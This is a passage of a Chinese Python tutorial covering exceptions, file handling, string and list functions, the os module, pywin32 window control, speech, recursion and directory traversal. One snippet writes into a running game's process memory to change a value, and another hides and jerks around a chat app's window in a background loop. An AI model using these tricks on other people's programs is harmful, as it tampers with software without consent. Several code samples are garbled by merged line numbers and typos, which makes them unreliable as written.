ZeroDivisionError: print(&quot;Divided by zero&quot;)except (ValueError, TypeError): print(&quot;Error occurred&quot;) 结果： Error occurred #匹配到了TypeError错误 没有指定任何异常的 except 语句将捕获所有错误。应该谨慎使用，因为他们可以捕捉到意想不到的错误并隐藏编程错误。 例如： 1234567try: word = &quot;spam&quot; print(word / 0)except: print(&quot;发生错误&quot;) 结果： 发生错误 在处理用户输入时，异常处理特别有用。 2，finally 语句为了确保某些代码不管发生什么错误都运行，可以使用 finally 语句。finally 语句放置在 try/except 语句的底部。 finally 语句中的代码总是在 try 中的代码执行之后运行，可能在 except 代码块中运行。 123456789101112try: print(&quot;Hello&quot;) print(1 / 0)except ZeroDivisionError: print(&quot;Divided by zero&quot;)finally: print(&quot;这段代码无论如何都会运行&quot;) 结果：HelloDivided by zero这段代码无论如何都会运行 如果在前面的一个块中发生未捕获的异常，也会运行 finally 语句中的代码。 对于文件处理就很有用，无论怎么样都要关闭文件 3，引发异常(rause)您可以使用 raise 语句引发异常。 123456print(1)raise ValueErrorprint(2) #这条就不会执行了结果：1ValueError 您需要指定引发的异常的类型。 引发异常可以提供一些异常的描述。 1234name = &quot;123&quot;raise NameError(&quot;Invalid name!&quot;)结果：NameError: Invalid name! 在 except 块下，raise 语句可以在没有参数的情况下使用来重新引发发生的异常。 123456789try: num = 5 / 0except: print(&quot;An error occurred&quot;) raise 结果： An error occurredZeroDivisionError: division by zero 可以在 except 块外面使用 raise 语句 4，断言(assert)使用 assert 断言是一个非常好的习惯，python assert 断言句语格式及用法很简单。在没完善一个程序之前，我们不知道程序在哪里会出错，与其让它在运行最崩溃，不如在出现错误条件时就崩溃，这时候就需要 assert 断言的帮助。 assert 断言是声明其布尔值必须为真的判定，如果发生异常就说明表达示为假。可以理解 assert 断言语句为 raise-if-not，用来测试表示式，其返回值为假，就会触发异常。 断言是通过使用 assert 语句来执行的。 123456789print(1)assert 2 + 2 == 4print(2)assert 1 + 1 == 3 #这里出错，就不会输出下面的了print(3)结果：12AseertionError 程序员经常在函数的开始处放置断言来检查有效的输入，并且在函数调用之后检查有效的输出。 如果断言失败，assert 可以接受第二个传递给 AssertionError 的参数。 12345678910111213temp = -10assert (temp &gt;= 0), &quot;Colder than absolute zero!&quot;结果：AssertionError: Colder than absolute zero!def func(num, div): assert (div != 0), &quot;div不能为0&quot; return num / div print(func(10, 0))结果： assert (div != 0), &quot;div不能为0&quot;AssertionError: div不能为0 AssertionError 异常可以像使用 try-except 语句的任何其他异常一样被捕获和处理，但是如果不处理，这种类型的异常将终止程序。 10，文件操作1，打开文件您可以使用 Python 来读取和写入文件的内容。 文本文件是很容易操作的。在编辑文件之前，必须使用 open 函数打开文件。 123path = r&quot;d:\\py_work\\filename.txt&quot;myfile = open(path, &quot;r&quot;,encoding=&quot;utf-8&quot;) open 函数的参数是文件的路径。 12345678910111213open(path, flag，[encoding],[errors])path:要打开文件的路径flag:打开方式r 以只读的方式打开文件，文件的描述符放在文件的开头，默认参数rb 以二进制格式打开一个文件用于只读，文件的描述符放在文件的开头r+ 打开文件用于读写，文件的描述符放在文件的开头w 打开一个文件只用于写入，如果该文件已经存在会覆盖，如果不存在则创建新文件wb 打开一个文件只用于写入二进制，如果该文件已经存在会覆盖，如果不存在则创建新文件w+ 打开一个文件用于读写，如果不存在则创建新文件a 打开一个文件用于追加，如果文件存在，文件描述符将放到至文件末尾a+ encoding:编码方式 encoding=&quot;utf-8&quot; 默认是utf-8errors:错误处理 errors=&quot;ignore&quot; 忽略错误 常用的 如果文件与程序位于同一目录中，你可以直接使用文件名称。 您可以通过向 open 函数应用第二个参数来指定用于打开文件的模式。 参数 “r” 表示在读取模式下打开，这是默认设置。 参数“w”表示写入模式，用于重写文件的内容。 参数“a”表示追加模式，用于将新内容添加到文件末尾。 将“b”添加到某个模式中文件将以二进制模式打开它，该模式用于非文本文件（如图像和声音文件）。 例如: 123456789# 写模式open(&quot;filename.txt&quot;, &quot;w&quot;)# 读模式open(&quot;filename.txt&quot;, &quot;r&quot;)open(&quot;filename.txt&quot;)# 二进制写入模式open(&quot;filename.txt&quot;, &quot;wb&quot;) 文件被打开和使用后要记得关闭它。通过文件对象的 close 方法进行关闭。 123file = open(&quot;filename.txt&quot;, &quot;w&quot;)# do stuff to the filefile.close() 2，读文件可以使用 read 方法读取以文本模式打开的文件的内容。 123456path = r&quot;d:\\py_work\\filename.txt&quot;file = open(path, &quot;r&quot;)cont = file.read()print(cont)file.close() 这将打印文件 “filename.txt” 的所有内容。 如果只要读取文件一部分内容，你可以提供一个数字作为 read 方法的参数。决定要读取的字符数。 是按照字符个数来读，不是字节数。 你可以进行多次调用来读取同一个文件对象，逐字节读取更多的内容。如果没有参数，read 返回文件的其余部分内容。 123456file = open(&quot;filename.txt&quot;, &quot;r&quot;)print(file.read(16))print(file.read(4))print(file.read(4))print(file.read())file.close() 打开utf-8格式编码的文件 1file = open(&quot;filename.txt&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;) 在读取完文件中的所有内容之后，如果试图从该文件进一步读取，将会返回一个空字符串，因为您正试图从文件末尾进行读取。 12345678910file = open(&quot;filename.txt&quot;, &quot;r&quot;)file.read()print(&quot;Re-reading&quot;)print(file.read())print(&quot;Finished&quot;)file.close()结果：Re-readingFinished 要检索文件中的每一行，可以使用 readlines 方法返回一个列表，其中每个元素是文件中的一行。 #若给定的参数数字大于0，返回实际size的字节行数 1file.redlines(30) seek方法修改描述符的位置 1file.seek(10) 例如： demofile.txt 123Line 1 textLine 2 textLine 3 text demo.py 12345file = open(&quot;demofile.txt&quot;, &quot;r&quot;)print(file.readlines())file.close()结果：['Line 1 text\\n', 'Line 2 text\\n', 'Line 3 text'] 您也可以使用 for 循环遍历文件中的行： 123456789101112file = open(&quot;demofile.txt&quot;, &quot;r&quot;)for line in file: print(line)file.close() 结果：Line 1 textLine 2 textLine 3 text 在输出中，行由空行分隔，因为 print 函数在其输出结束时自动添加新行。 整体代码示例： 123456789101112path = r&quot;d:\\py_work\\filename.txt&quot;try: myfile = open(path, &quot;r&quot;,encoding=&quot;utf-8&quot;) read = myfile.read(7) #输出7位字符 print(read) print(myfile.read()) #输出剩余全部字符 print(&quot;**********&quot;) myfile.seek(0) #把描述符清零 print(myfile.read()) #可以继续从开头开始读了finally: #不管怎样都会执行 if myfile: #判断文件是否打开，如果打开则执行关闭文件 myfile.close() 3，写文件要写入文件，请使用 write 方法，该方法将字符串写入文件。 例如: 123456789file = open(&quot;newfile.txt&quot;, &quot;w&quot;)file.write(&quot;This has been written to a file&quot;)file.close()file = open(&quot;newfile.txt&quot;, &quot;r&quot;)print(file.read())file.close()结果：This has been written to a file “w” 模式如果文件不存在，将创建一个文件。 如果写入成功的话 write 方法返回写入文件的字节数。 1234567msg = &quot;Hello world!&quot;file = open(&quot;newfile.txt&quot;, &quot;w&quot;)amount_written = file.write(msg)print(amount_written)file.close()结果：12 要确保文件在使用后始终关闭，避免浪费资源是一种好的做法。一个方法是使用 try 和 finally 。 123456try: f = open(&quot;newfile.txt&quot;) print(f.read())finally: print(&quot;即使发生错误，这可以确保文件始终关闭。&quot;) f.close() 一个替代方法是使用语句。这将创建一个临时变量（通常称为f），该变量只能在 with 语句的缩进块中访问。 12with open(&quot;newfile.txt&quot; ,&quot;r&quot; ,encoding=&quot;utf-8&quot;) as f: print(f.read()) 在 with 语句结束时，即使文件内部发生异常，文件也会自动关闭。 11,列表切片列表切片（List slices）提供了从列表中检索值的更高级的方法。基本列表切片涉及用两个以冒号分隔的整数索引列表。 列表切片返回一个包含索引之间旧列表中所有值的新列表。 12345678squares = [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]print(squares[2:6])print(squares[3:8])print(squares[0:1])结果：[4, 9, 16, 25][9, 16, 25, 36, 49][0] 和Range参数一样，在一个 slice 中提供的第一个索引被包含在结果中，但是第二个索引没有。 如果省略了切片中的第一个数字，则将从列表第一个元素开始。 如果第二个数字被省略，则认为是到列表结束。 123456squares = [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]print(squares[:7])print(squares[7:])结果：[0, 1, 4, 9, 16, 25, 36][49, 64, 81] 切片也可以在元组上使用。 列表切片还可以有第三个数字，表示间隔。 12345678squares = [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]print(squares[::2])print(squares[2:8:3])结果：[0, 4, 16, 36, 64][4, 25][2：8：3] 包含从索引2到8间隔3的元素。 负值也可用于列表切片（和正常列表索引）。当切片（或普通索引）中的第一个和第二个值使用负值时，它们将从列表的末尾算起。 123456789101112squares = [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]print(squares[1:-1])print(squares[-3:-1])print(squares[::-1])结果：[1, 4, 9, 16, 25, 36, 49, 64][49, 64][81, 64, 49, 36, 25, 16, 9, 4, 1, 0]sqs = [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]print(sqs[7:5:-1])[49, 36] 如果切片第三个数值使用负值，则切片进行逆序截取。使用[::-1]作为切片是反转列表的常用方法。 12，字符串格式化到目前为止，要组合字符串和非字符串，将非字符串转换为字符串并添加它们。 字符串格式化提供了一种更强大的方法来在字符串中嵌入非字符串。字符串格式化使用字符串的 format 方法来替换字符串中的多个参数。 例如： 123456# string formattingnums = [4, 5, 6]msg = &quot;Numbers: {0} {1} {2}&quot;. format(nums[0], nums[1], nums[2])print(msg)结果：Numbers: 4 5 6 format 函数的每个参数都放在相应位置的字符串中，这个位置是用花括号{}确定的。 字符串格式化也可以使用命名参数完成。、 1234a = &quot;{x}, {y}&quot;.format(x=5, y=12)print(a)结果：5,12 字符串格式化总结 总结: 1、按照默认顺序，不指定位置 123print(&quot;{} {}&quot;.format(&quot;hello&quot;,&quot;world&quot;) )hello world 2、设置指定位置，可以多次使用 123print(&quot;{0} {1} {0}&quot;.format(&quot;hello&quot;,&quot;or&quot;))hello or hello 3、使用列表格式化 12345person = {&quot;name&quot;:&quot;W3Cschool&quot;,&quot;age&quot;:5}print(&quot;My name is {name} . I am {age} years old .&quot;.format(**person))My name is W3Cschool . I am 5 years old . 4、通过列表格式化 12345stu = [&quot;W3Cschool&quot;,&quot;linux&quot;,&quot;MySQL&quot;,&quot;Python&quot;]print(&quot;My name is {0[0]} , I love {0[1]} !&quot;.format(stu))My name is W3Cschool , I love linux ! 字符串函数转换大小写 Python 包含许多有用的内置函数和方法来完成常见的任务。 join - 以另一个字符串作为分隔符连接字符串列表。 replace - 用另一个替换字符串中的一个子字符串。 startswith 和 endswith - 确定是否在字符串的开始和结尾处有一个子字符串。 要更改字符串的大小写，可以使用 lower 和 upper 。 split 方法与 join 相反，把一个字符串转换成一个列表。 **title()**每个单词的首字母大写 center(width, fillchar) 返回指定宽度的居中字符串，fillchar为填充的字符，默认是空格填充 **ljust(40，fillchar)**返回指定字符的左对齐 rjust(width,fillchar) 返回字符的右对齐 count(str[, start][, end]) #返回字符串中str出现的次数，可以指定一个范围，默认从头到尾 lstrip() 截掉字符串左侧指定的字符，默认为空格 rstrip() 截掉字符串右侧指定的字符，默认为空格 **strip()**截掉字符串左右两侧的指定字符，默认为空格 1234567891011121314151617181920212223print(&quot;, &quot;.join([&quot;spam&quot;, &quot;eggs&quot;, &quot;ham&quot;]))#打印 &quot;spam, eggs, ham&quot;print(&quot;Hello ME&quot;.replace(&quot;ME&quot;, &quot;world&quot;))#打印 &quot;Hello world&quot;print(&quot;This is a sentence.&quot;.startswith(&quot;This&quot;))# 打印 &quot;True&quot;print(&quot;This is a sentence.&quot;.endswith(&quot;sentence.&quot;))# 打印 &quot;True&quot;print(&quot;This is a sentence.&quot;.upper())# 打印 &quot;THIS IS A SENTENCE.&quot;print(&quot;AN ALL CAPS SENTENCE&quot;.lower())#打印 &quot;an all caps sentence&quot;print(&quot;spam, eggs, ham&quot;.split(&quot;, &quot;)) #以,为分隔符，#打印 &quot;['spam', 'eggs', 'ham']&quot;qq = &quot;30844875@qq.com&quot;lei= qq.split(&quot;@&quot;)[1].split(&quot;.&quot;)[0] #把QQ邮箱转成列表，取值下标指定的参数#打印 qq 类型的邮箱str1 = &quot;sunck is a good man&quot;print(str1.title())#打印 Sunck Is A Good Manprint(str1.center(40, &quot;-&quot;))#打印 ----------sunck is a good man----------- 结果： 123456789spam, eggs, hamHello worldTrueTrueTHIS IS A SENTENCE.an all caps sentence['spam', 'eggs', 'ham']Sunck Is A Good Man----------sunck is a good man----------- 数字函数 要查找某些数字或列表的最大值或最小值，可以使用 max 和 min 。 要将数字转成绝对值（该数字与0的距离），请使用 abs 。 要将数字四舍五入到一定的小数位数，请使用 round 。 要计算一个列表数字的总和，请使用 sum 。 求x的y次方 2^5 1234567891011121314151617print(min(1, 6, 3, 4, 0, 7, 1))print(max([1, 2, 9, 2, 4, 7, 8]))print(abs(-93))print(round(3.456))print(round(2.456, 2))print(abs(22))print(sum([1, 2, 3, 4, 5, 6]))print(pow(2, 5))结果：099333.46222132 列表函数 all 和 any 将列表作为参数， 通常在条件语句中使用。 all 列表中所有值均为 True 时，结果为 True，否则结果为 False。 any 列表中只要有一个为 True，结果为 True，反之结果为 False。 enumerate 函数可以用来同时迭代列表的键和值 123456789101112131415161718nums = [55, 44, 33, 22, 11]if all([i &gt; 5 for i in nums]): print(&quot;All larger than 5&quot;)if any([i % 2 == 0 for i in nums]): print(&quot;At least one is even&quot;)for v in enumerate(nums): print(v) 结果：All larger than 5At least one is even(0, 55)(1, 44)(2, 33)(3, 22)(4, 11) 文本分析这是一个示例项目，展示了一个分析示例文件以查找每个字符占用的文本百分比的程序。 123456filename = input(&quot;输入一个文件名: &quot;)with open(filename) as f: text = f.read()print(text) 程序的下一部分将查找每个字母占据文本的百分比。 1234567891011121314151617def count_char(text, char): count = 0 for c in text: #2，循环打开的文件内容 if c == char: #3，内容有等于char 则输出0+1次，出现多次就再加1 count += 1 return count #4，最终返回出现的总数filename = input(&quot;输入一个文件名: &quot;)with open(filename) as f: text = f.read() print(count_char(text, &quot;r&quot;)) #1，输出文件名，text ==文件名for char in &quot;abcdefghijklmnopqrstuvwxyz&quot;: perc = 100 * count_char(text, char) / len(text) print(&quot;{0} - {1}%&quot;.format(char, round(perc, 2))) 12, os模块os: 包含了普遍的操作系统的功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import os print(os.name) # 获取操作系统类型结果： nt windows系统posix Linux、Unix或者Mac os x系统print(os.uname()) #获取系统详细信息，posix系统类型上可以支持posix.uname_result(sysname='Linux', nodename='server1.com', release='3.10.0-693.el7.x86_64', version='#1 SMP Tue Aug 22 21:09:27 UTC 2017', machine='x86_64')print(os.environ) #获取操作系统中的所有环境变量print(os.environ.get(&quot;pythonpath&quot;)) #获取指定环境变量print(os.curdir) #获取当前路径print(os.getcwd) #获取当前工作目录，即当前python脚本所在的目录,绝对路径print(os.listdir(r&quot;d:\\py_work&quot;)) #以列表的形式获取指定目录下的文件列表 默认是当前脚本目录下的文件列表os.mkdir(r&quot;d:\\py_work\\newdir&quot;) # 在指定目录下创建目录。默认是在当前目录下创建os.rmdir(r&quot;d:\\py_work\\newdir) # 在指定目录下删除目录print(os.stat(&quot;newdir&quot;)) #获取文件属性os.rename(&quot;newdir&quot;,&quot;kaige&quot;) #重命名，把newdir重命名为kaigeos.remove(&quot;file.txt&quot;) #删除普通文件os.system(&quot;notepad&quot;) #运行shell命令 需要执行什么就直接输入参数里就可以了os.system(&quot;taskkill /f /im notepad.exe&quot;) #关闭某个程序。os.system(&quot;write&quot;) #写字板 os.system(&quot;shutdown -s -t 60&quot;) #设置关机60秒后os.system(&quot;shutdown -a&quot;) #计划的关机取消print(os.path.abspath(&quot;.&quot;)) #查看当前目录的绝对路径#拼接路径 p1 = r&quot;d:\\py_work&quot;p2 = &quot;newdir&quot;print(os.path.join(p1,p2)) #注意： 参数2里的开始不要有斜杠结果：d:\\py_work\\newdir#拆分路径 拆分最后一个path2 = r&quot;d:\\py_work\\newdir&quot;print(os.path.split(path2))结果：('d:\\\\py_work', 'newdir')#获取扩展名path2 = r&quot;d:\\py_work\\newdir\\test.txt&quot;print(os.path.splitext(path2))结果：('d:\\\\py_work\\\\newdir\\\\test', '.txt')#判断是否是目录print(os.path.isdir(path2))结果：Falsh#判断文件是否存在print(os.path.isfile(path2))结果：True#判断目录是否存在print(os.path.exists(path2))# 判断文件大小，以字节来算print(os.path.getsize(path2))#获取目录名print(os.path.dirname(path2))print(os.path.basename(path2)) 13，窗口控制需要下载模块 pip install pywin32 123456789101112131415161718192021import win32conimport win32guiimport time#找出窗体的编号QQWin = win32gui.FindWindow(&quot;TXGuiFoundation&quot;,&quot;QQ&quot;)#隐藏窗口win32gui.ShowWindow(QQWin,win32con.SW_HIDE)time.sleep(2)#显示窗体win32gui.ShowWindow(QQWin,win32con.SW_SHOW)#循环隐藏和显示窗口while True: win32gui.ShowWindow(QQWin, win32con.SW_HIDE) time.sleep(1) win32gui.ShowWindow(QQWin, win32con.SW_SHOW) time.sleep(1) 2,控制窗体的位置和大小1234567891011121314151617181920212223import win32conimport win32guiimport timeimport random#QQWin = win32gui.FindWindow(&quot;TXGuiFoundation&quot;,&quot;QQ&quot;)#参数1：控制的窗体#参数2：大致方位，HWND_TOPMOST上方#参数3：位置x#参数4：位置y#参数5：长度#参数6：宽度#控制窗口随机乱动while True: QQWin = win32gui.FindWindow(&quot;TXGuiFoundation&quot;, &quot;QQ&quot;) x = random.randrange(900) y = random.randrange(600) win32gui.SetWindowPos(QQWin,win32con.HWND_TOPMOST,x,y,300,300,win32con.SWP_SHOWWINDOW)#通过cmd启动脚本，后台运行 start /b python 1控制窗口.py 3,语音控制1,一个简单的语音模仿程序语音合成 12345678910111213141516171819#系统客户端import win32com.clientimport timeprint(&quot;输入退出或者quit可以退出&quot;)dehua = win32com.client.Dispatch(&quot;SAPI.SPVOICE&quot;)luke =&quot;这是逸尘写的小程序，欢迎测试哦&quot;dehua.Speak(luke)time.sleep(0.5)dehua.Speak(&quot;你输入什么。我就语音读什么&quot;)dehua.Speak(&quot;请输入吧！&quot;)while True: hua =input(&quot;请输入 &quot;) if hua == &quot;退出&quot; or hua == &quot;quit&quot;: print(&quot;你退出了&quot;) break dehua.Speak(hua) 2,speech语音模块模块简介 当我们想在windows平台上利用Python将文本转化为语音输出，用作语音提示，这时就要用到speech模块。该模块的主要功能有：语音识别、将指定文本合成语音以及语音信号输出等。 下载 用pip命令：pip install speech 另外，该模块以pywin32作为支撑，需要先下载pywin32模块，pywin32是一款Python Win32增强工具，可以方便得使用Python调用WIN32COM接口。可以在这个网站找到适合你系统的pywin32安装包下载安装：https://sourceforge.net/projects/pywin32/files/pywin32/ 导入 import speech 修改 当我们使用python3调用speech会报错，需要手工修改speech.py程序： line59 修改 import thread –&gt; import threading line157 修改 print prompt –&gt; print(prompt) 示列代码 12345678# 将输入文字转化为语音信号输出import speech while True: speech.say(&quot;请输入：&quot;) str = input(&quot;请输入：&quot;) speech.say(&quot;你输入的内容是: &quot;) speech.say(str) 22,内存修改1234567891011121314151617181920212223242526#进程模块import win32process#系统import win32conimport win32guiimport win32apiimport ctypesPROCESS_ALL_ACCESS =（0x000F0000|0x0010000|0xFFF)#找窗体win = win32gui.FindWindow(&quot;MainWindow&quot;,&quot;植物大战僵尸中文版&quot;)#根据窗体找到进程号hid, pid = win32process.GetWindowThreadProcessId(win)#以最高权限打开进程p = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, pid)data = ctypes.c_long()#加载内涵模块md = ctypes.windll.LoadLibrary(r&quot;‪C:\\Windows\\System32\\KernelBase.dll&quot;)#读取内存md.ReadProcessMemory(int(p), 311944712,ctypes.byref(data), 4 , None)print(&quot;data =&quot;, data)#新值newData = ctypes.c_long(10000)#修改md.WriteProcessMemory(int(p), 311944712, ctypes.byref(newData), 4 , None) 二，python3进阶知识重点1，函数式编程函数式编程是一种编程风格（顾名思义）是基于函数的。 函数式编程的关键部分是高阶函数。在上一课中，我们已经将这个想法简单地看作是对象的功能。高阶函数将其他函数作为参数，或将其作为结果返回。 例如： 1234567891011def apply_twice(func, arg): #func= add_five了， return func(func(arg)) # 返回 +5(+5(10))== 5+(5+(10))def add_five(x): return x + 5 #如果改成x * 5 的话， 结果就会变成*5(*5(10))= 250了print(apply_twice(add_five, 10))结果：20函数 apply_twice 将另一个函数作为参数，并在其内部调用两次。 1，纯函数函数式编程试图使用纯函数。纯函数没有副作用，并且返回一个仅依赖于它们的参数的值。 这是数学工作中的函数：例如，对于相同的 x，cos(x) 总是返回相同的结果。 纯函数的例子： 123def pure_function(x, y): temp = x + 2*y return temp / (2*x + y) 非纯函数的例子： 123456some_list = []def impure(arg): some_list.append(arg) 上面的函数不是纯函数，因为它改变了 some_list 的状态。 纯函数优点和缺点。 纯函数具备： - 更容易推理和测试。 - 更高效。 一旦函数有一个输入，结果可以被存储并在下一次需要该输入的函数时被引用，从而减少函数被调用的次数。 - 更容易并行运行。 仅使用纯函数的主要缺点是它们主要使 I/O 的其他简单任务复杂化。 在某些情况下，他们也可能更难编写。 2, Lambda 表达式正常创建一个函数（使用 def）会自动将其分配给一个变量。 这与其他对象（如字符串和整数）的创建不同，它们可以在运行中创建，而不必将其分配给变量。 使用 lambda 语法创建函数。这种方式创建的函数被称为匿名函数。 将一个简单函数作为参数传递给另一个函数时，这种方法是最常用的。 语法如下： 1lambda 参数列表: 表达式 1234def my_func(f, arg): return f(arg)my_func(lambda x: 2*x*x, 5) # x表示参数 Lambda 函数从 lambon 演算中得名，这是 Alonzo Church 发明的计算模型。 Lambda 函数不如命名函数强大。 他们只能做需要单一表达的事情 - 通常相当于一行代码。 例如： 1234567#命名函数def polynomial(x): return x**2 + 5*x + 4print(polynomial(-4))#lambdaprint((lambda x: x**2 + 5*x + 4) (-4)) #-4的平方16 +(-20)+4=0 可以将 Lambda 函数分配给变量，并像普通函数一样使用。 例如： 123456double = lambda x: x * 2print(double(7))结果:14但是，很少这样做 - 用 def 定义一个函数通常会更好。 3， map和filter 函数内置的函数 map 和 filter 是在列表（或类似的称为迭代的对象）上运行的非常有用的高阶函数。 函数 map 接受一个函数和一个迭代器作为参数，并返回一个新的迭代器，该函数应用于每个参数。 例如： 12345678def add_five(x): return x + 5nums = [11, 22, 33, 44, 55]result = list(map(add_five, nums))print(result)结果：[16, 27, 38, 49, 60] 通过使用 lambda 语法，我们可以更容易地获得相同的结果。 12345nums = [11, 22, 33, 44, 55]result = list(map(lambda x: x+5, nums))print(result)为了将结果转换成列表，我们使用了 list 函数。 filter 函数通过删除与谓词（一个返回布尔值的函数）不匹配的项来过滤一个迭代。 语法： 1filter(function, iterable) function – 判断函数。 iterable – 可迭代对象 下面我们通过一个实例来说明： 12345nums = [11, 22, 33, 44, 55]res = list(filter(lambda x: x%2==0, nums)) #可以匹配偶数的结果就打印出来print(res)结果：[22,44] 与 map 一样，如果要打印结果，必须将结果显式转换为列表。 4，生成器生成器是一种可迭代的类型，如列表或元组。 与列表不同的是，它们不允许使用任意索引，但是它们仍然可以通过 for 循环迭代。 可以使用 函数 和 yield 语句来创建它们。 例如： 12345678910111213141516def countdown(): i=5 while i &gt; 0: yield i i -= 1 for i in countdown(): print(i) 结果：54 321yield 语句用于定义一个生成器，替换函数的返回值以向调用者提供结果而不破坏局部变量。 6 内建模块 itertoolsitertools 模块是一个标准库，包含了几个在函数式编程中很有用的函数。 一种类型的函数是无限迭代器。 count 函数从一个值无限增加。 cycle 函数无限次迭代（例如列表或字符串）。 repeat 函数重复一个对象，无论是无限还是特定的次数。 例如： 12345678910111213141516from itertools import countfor i in count(3): print(i) if i &gt;=11: break 结果：3 #从3开始无限增加，一直到11为止4567891011 itertools 中有许多功能可以在迭代器上运行，类似于映射和过滤。 例如： takewhile - 当判定函数（返回值为 True 或 False）保持为True时，从迭代中取得项目; chain - 将几个迭代结合成一个长整数; accumulate - 以可迭代的方式返回一个正在运行的值。 12345678from itertools import accumulate, takewhilenums = list(accumulate(range(8)))print(nums)print(list(takewhile(lambda x: x&lt;= 6, nums)))结果：[0, 1, 3, 6, 10, 15, 21, 28] #0+0=0，0+1=1,1+2=3,3+3=6,6+4=10,10+5=15,15+6=21,21+7=28，0-7范围[0, 1, 3, 6] itertool中还有几个组合函数，比如 product 和 permutation。 当你想用一些项目的所有可能的组合来完成任务时使用。 例如： 12345from itertools import product, permutationsletters = (&quot;A&quot;, &quot;B&quot;)print(list(product(letters, range(2)))) # 输出0-1和AB的各种组合print(list(permutations(letters))) #输出AB的各种可能的组合 结果： 12[('A', 0), ('A', 1), ('B', 0), ('B', 1)] [('A', 'B'), ('B', 'A')] 小节练习 12345678910111213def power(x, y): if y == 0: return 1 else: return x * power(x, y-1)print(power(3, 3)) # 3* power(3,2) 3*3*3 结果：27print(power(3, 4)) #输出 3* power(3,3) 3*3*3*3 结果：81 7,装饰器装饰器 是修改其他函数的功能的函数。装饰器有助于让我们的代码更简短。 当您需要扩展您不想修改的函数功能时，这是很理想的 12345678910111213141516def outer(func): def inner(): print(&quot;============&quot;) func() print(&quot;============&quot;) return innerdef func1(): print(&quot;Hello world!&quot;)f = outer(func1)f()结果:============Hello world!============ 我们定义了一个名为 outer的函数，它有一个单一的参数 func。 在 outer 中，我们定义了一个名为 inner的嵌套函数。 inner函数将打印一个字符串，然后调用 func()，并打印另一个字符串。 我们可以说，装饰变量是 func1的装饰版本 - 它是 func1加上一些东西。 这是通过重新赋值包含我们的函数的变量来完成的： 12func1 = outer(func1)func1() 这个模式可以随时用来包装任何功能。 Python通过预先用装饰器名称和 @symbol 预定义函数定义来提供支持，以便在装饰器中包装函数。 如果我们正在定义一个函数，我们可以使用@符号来“装饰”它： 123456789101112def outer(func): def inner(): print(&quot;============&quot;) func() print(&quot;============&quot;) return inner@outerdef func1(): print(&quot;Hello world!&quot;)func1() 这将与上面的代码具有相同的结果。 第二个例子： 123456789101112131415def outer(func): def inner(*args, **kwargs): #添加修改的功能 print(&quot;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&quot;) func(*args, **kwargs) return inner@outer #写了这句就可以省略say = outer(say) 了。def say(name, age): # 函数的参数理论上是无限的，但是实际上最好不要超过6,7个 print(&quot;my name is %s, I am %d years old &quot; %(name, age)) #say = outer(say) say(&quot;luke&quot;, 18) 一个函数可以有多个装饰器。 8,递归递归调用: 一个函数，调用了自身，称为递归调用 递归函数: 一个会调用自身的函数称为递归函数 凡是循环能干的是，递归都能干 方式 写出临界条件 找这一次和上一次的关系 假设当前函数已经能用，调用自身计算上一次的结果，再求出本次的结果 12345678910111213141516171819202122232425262728#输入一个数(大于等于1)，求1+2+3+.....+n的和def sum1(n): sum = 0 for x in range(1, n +1): sum += x return sumres = sum1(5)print(&quot;res =&quot;,res)#递归函数def sum2(n): if n == 1: #临界条件 return 1 else: return n + sum2(n - 1)res = sum2(5)print(&quot;res =&quot;,res)结果都是15 '''5 + sum2(4)5 + 4 + sum2(3)5 + 4 +3 + sum2(2)5 + 4+ 3+ 2 + sum2(1)5 + 4 + 3 + 2 + 1 等于返回15 ''' 9.栈与队列 (循环的处理一些事情)栈结构 先进后出 1234567891011121314151617181920212223# 模拟栈结构stack = []#压栈(向栈里存数据)stack.append(&quot;A&quot;)print(stack)stack.append(&quot;B&quot;)print(stack)stack.append(&quot;C&quot;)print(stack)#出栈(在栈里取数据)res1 = stack.pop()print(&quot;res1 =&quot;, res1)print(stack)res2 = stack.pop()print(&quot;res2 = &quot;, res2)print(stack)res3 = stack.pop()print(&quot;res3 = &quot;, res3)print(stack) 队列 先进先出 123456789101112131415161718192021222324import collections#创建一个队列queue = collections.deque()print(queue)#进队(存数据)queue.append(&quot;A&quot;)print(queue)queue.append(&quot;B&quot;)print(queue)queue.append(&quot;C&quot;)print(queue)#出队(取数据)res1 = queue.popleft()print(&quot;res1 = &quot;, res1)print(queue)res2 = queue.popleft()print(&quot;res2 = &quot;, res2)print(queue)res3 = queue.popleft()print(&quot;res3 = &quot;, res3)print(queue) 10，目录遍历递归遍历目录 12345678910111213141516171819import osdef getAllDir(path, sp = &quot;&quot;): #得到当前目录下的所有文件 filesList = os.listdir(path) #处理每一个文件 sp = sp + &quot; &quot; for fileName in filesList: #判断是否是路径(用绝对路径) fileAbsPath = os.path.join(path,fileName) if os.path.isdir(fileAbsPath): print(sp +&quot;目录：&quot;, fileName) #递归调用 getAllDir(fileAbsPath ,sp) else: print(sp +&quot;普通文件：&quot;, fileName)getAllDir(r&quot;d:\\py_work&quot;) 栈模拟递归遍历 目录(深度遍历) 12345678910111213141516171819202122232425262728import osdef getAllDirDE(path): stack = [] stack.append(path) #处理栈，当栈为空的时候结束循环 while len(stack) != 0: #从栈里取出数据,这里就等于拿到了绝对路径 dirPath = stack.pop() #print(dirPath) #目录下的所有文件 filesList = os.listdir(dirPath) #处理每一个文件，如果是普通文件则打印出来，如果是目录则将该目录的地址压栈 for fileName in filesList: fileAbsPath = os.path.join(dirPath,fileName) if os.path.isdir(fileAbsPath): #判断是不是目录， #是目录就压栈 print(&quot;目录：&quot; + fileName) #输出目录名[&quot;B&quot;] stack.append(fileAbsPath) #再进行压栈，放入目录，再while循环判断 else: #打印普通文件 print(&quot;文件：&quot;+ fileName)getAllDirDE(r&quot;d:\\py_work&quot;) 队列模拟递归遍历(广度遍历) 123456789101112131415161718192021222324import osimport collectionsdef getAllDirQU(path): queue = collections.deque() #进队 queue.append(path) while len(queue) != 0: #出队数据 dirPath = queue.popleft() #找出所有的文件 filesList = os.listdir(dirPath) for fileName in filesList: #绝对路径 fileAbsPath = os.path.join(dirPath,fileName) #是否是目录，是目录就进队，不是就打印 if os.path.isdir(fileAbsPath): print(&quot;目录： &quot; + fileName) queue.append(fileAbsPath) else: print(&quot;普通文件：&quot; + 